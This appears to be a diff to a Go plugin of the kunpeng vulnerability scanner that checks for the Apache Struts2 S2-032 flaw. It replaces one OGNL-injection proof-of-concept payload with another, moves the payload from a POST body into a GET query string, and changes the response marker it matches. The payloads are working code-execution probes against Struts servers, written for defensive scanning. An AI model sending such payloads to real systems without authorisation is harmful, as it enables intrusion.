@@ -5,8 +5,8 @@ import (
 	"regexp"
 	"strings"
 
-	"github.com/opensec-cn/kunpeng/plugin"
-	"github.com/opensec-cn/kunpeng/util"
+	"kunpeng/plugin"
+	"kunpeng/util"
 )
 
 type struts2_32 struct {
@@ -38,7 +38,7 @@ func (d *struts2_32) GetResult() []plugin.Plugin {
 	return result
 }
 func (d *struts2_32) Check(URL string, meta plugin.TaskMeta) (b bool) {
-	poc := "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
+	poc := "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086"
 	var checkURL string
 	for _, url := range meta.FileList {
 		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
@@ -49,7 +49,8 @@ func (d *struts2_32) Check(URL string, meta plugin.TaskMeta) (b bool) {
 	if checkURL == "" {
 		return false
 	}
-	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
+	checkURL = checkURL + "?" + poc
+	request, err := http.NewRequest("GET", checkURL, nil)
 	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	if err != nil {
 		return false
@@ -58,7 +59,7 @@ func (d *struts2_32) Check(URL string, meta plugin.TaskMeta) (b bool) {
 	if err != nil {
 		return false
 	}
-	if strings.Contains(resp.ResponseRaw, "66666664") {
+	if strings.Contains(resp.ResponseRaw, "1008660253718") {
 		result := d.info
 		result.Response = resp.ResponseRaw
 		result.Request = resp.RequestRaw
